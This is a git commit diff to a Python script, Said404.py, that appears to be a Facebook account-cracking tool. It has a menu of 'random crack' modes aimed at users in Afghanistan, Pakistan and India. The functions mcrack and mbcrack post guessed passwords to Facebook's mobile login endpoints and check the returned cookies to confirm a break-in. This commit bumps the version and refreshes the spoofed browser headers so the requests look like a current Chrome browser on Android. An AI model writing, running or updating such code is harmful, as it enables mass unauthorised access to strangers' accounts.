d0c5eb17d4b9f7799432ac816811322ea9d625fd
R-Said <134964357+R-Said@users.noreply.github.com>
2023-05-30 12:46:59 +0430

    Add files via upload

--- Said404.py
+++ Said404.py
@@ -197,7 +197,7 @@ logo = """
 \033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37mRaziqullah Saadat
 \033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37mSaid404
 \033[1;37m[+] \033[1;37mTOOL STATUS  :  \033[1;37mFREE
-\033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m4.0.8
+\033[1;37m[+] \033[1;37mTOOL VIRSION :  \033[1;31m4.0.9
 \x1b[1;97m[+]═══════════════════════════════════════════"""
 loop = 0
 oks = []
@@ -209,9 +209,9 @@ def menu():
 	os.system('clear')
 	print(logo)
 	print('[1] START RANDOM CARACK M [1]FOR AFGHANISTAN') 
-	print('[2] START RANDOM CARACK M [2]FORM RAFI ULLAH') 
-	print('[3] START RANDOM CARACK M [3]FORM AFG KING') 
-	print('[4] START RANDOM CARACK M [4]FORM HAZRAT') 
+	print('[2] START RANDOM CARACK M [2]FORM RAZIQ ULLAH') 
+	print('[3] START RANDOM CARACK M [3]FORM AFG Saadat') 
+	print('[4] START RANDOM CARACK M [4]FORM RAZIQ') 
 	print('[5] START RANDOM CARACK M [5]FOR PAKISTAN') 
 	print('[6] START RANDOM CARACK M [1] FOR INDIA') 
 	print('[+]═══════════════════════════════════════════')
@@ -349,19 +349,20 @@ def mcrack(uid,pwx,tl):
 			header_freefb = {'authority':'m.facebook.com',
 			'method': 'GET',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '"Google Chrome";v="101", "Not)A;Brand";v="99", "Chromium";v="105"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Windows"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'referer':'https://p.facebook.com/',
-			'upgrade-insecure-requests': '1',
-			'user-agent': ua}
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua}
 			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -579,17 +580,20 @@ def mbcrack(uid,pwx,tl):
 			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': ua}
+	        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua}
 			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
